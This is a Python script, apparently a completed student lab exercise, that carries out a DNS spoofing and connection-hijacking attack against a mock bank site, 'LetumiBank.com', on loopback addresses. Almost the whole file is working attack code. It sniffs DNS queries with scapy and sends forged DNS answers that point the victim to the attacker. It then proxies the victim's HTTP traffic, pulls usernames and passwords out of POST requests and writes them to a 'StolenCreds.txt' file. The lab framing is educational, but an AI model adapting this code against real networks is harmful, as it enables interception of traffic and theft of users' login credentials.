import os
import argparse
import socket
from scapy.all import *
conf.L3socket = L3RawSocket
WEB_PORT = 8000
HOSTNAME = "LetumiBank.com"


def resolve_hostname(hostname):
	# IP address of HOSTNAME. Used to forward tcp connection.
	# Normally obtained via DNS lookup.
	return "127.1.1.1"


def log_credentials(username, password):
	# Write stolen credentials out to file.
	# Do not change this.
	with open("lib/StolenCreds.txt", "wb") as fd:
		fd.write(str.encode("Stolen credentials: username=" + username + " password=" + password))


def check_credentials(client_data):
	# TODO: Take a block of client data and search for username/password credentials.
	# If found, log the credentials to the system by calling log_credentials().
	data_string = str(client_data)
	if "password" in data_string and "username" in data_string:
		usernameId = data_string.find("username=")
		usernameEnd = data_string[usernameId:].find("&")
		username = data_string[usernameId+len("username=") : usernameId + usernameEnd]
		passwordId = data_string.find("password=")
		passwordEnd = data_string[passwordId:].find("\\r\\n\\r\\n")
		password = data_string[passwordId+len("password="): passwordId+passwordEnd]
		#print ("username is " +username +" and password is "+ password)
		log_credentials(username,password)
	
def handle_tcp_forwarding(client_socket, client_ip, hostname):
	# Continuously intercept new connections from the client
	# and initiate a connection with the host in order to forward data

		# TODO: accept a new connection from the client on client_socket and
		# create a new socket to connect to the actual host associated with hostname.
		
		# TODO: read data from client socket, check for credentials, and forward along to host socket.
		# Check for POST to '/post_logout' and exit after that request has completed.
	while True:
		cConn , addr = client_socket.accept()
		cData = cConn.recv(50000)
		data = str(cData)
		if "POST" in data :
			check_credentials(data)
		hostSock = socket.socket()
		hostAddr = resolve_hostname(hostname)
		hostSock.connect((hostAddr,WEB_PORT))
		hostSock.send(cData)
		resp = hostSock.recv(50000)
		cConn.send(resp)
		cConn.close()
		if "POST" in data and "/post_logout" in data:
			sys.exit()	


def dns_callback(packet, extra_args):
	# TODO: Write callback function for handling DNS packets.
	# Sends a spoofed DNS response for a query to HOSTNAME and calls handle_tcp_forwarding() after successful spoof.
	
	sourceAddr=extra_args[1]
	clientSock=extra_args[0]

	if packet.haslayer(DNS):
		dnsQuery = packet[DNSQR]
		ip = packet[IP]
		qr_name = str(dnsQuery.qname)
		dns = packet[DNS]
		udp = packet[UDP]	
		if HOSTNAME in qr_name :
			resp = IP(dst=ip.src,src=ip.dst) / UDP(dport=udp.sport,sport=udp.dport) / DNS(id=dns.id,qd=dnsQuery,qr=1,aa=1,an= DNSRR(rrname=HOSTNAME,rdata=sourceAddr)) 	
			send(iface="lo",x=resp)
			handle_tcp_forwarding(clientSock,sourceAddr,HOSTNAME)
def sniff_and_spoof(source_ip):
	# TODO: Open a socket and bind it to the attacker's IP and WEB_PORT.
	# This socket will be used to accept connections from victimized clients.
	newSock = socket.socket()
	newSock.bind((source_ip,WEB_PORT))
	newSock.listen()
	
	sniff(filter="udp port 53 ",prn=lambda dns: dns_callback(dns,(newSock,source_ip)),
	iface="lo")
	# TODO: sniff for DNS packets on the network. Make sure to pass source_ip
	# and the socket you created as extra callback arguments. 


def main():
	parser = argparse.ArgumentParser(description='Attacker who spoofs dns packet and hijacks connection')
	parser.add_argument('--source_ip', nargs='?', const=1, default="127.0.0.3", help='ip of the attacker')
	args = parser.parse_args()

	sniff_and_spoof(args.source_ip)


if __name__ == "__main__":
	# Change working directory to script's dir.
	# Do not change this.
	abspath = os.path.abspath(__file__)
	dirname = os.path.dirname(abspath)
	os.chdir(dirname)
	main()
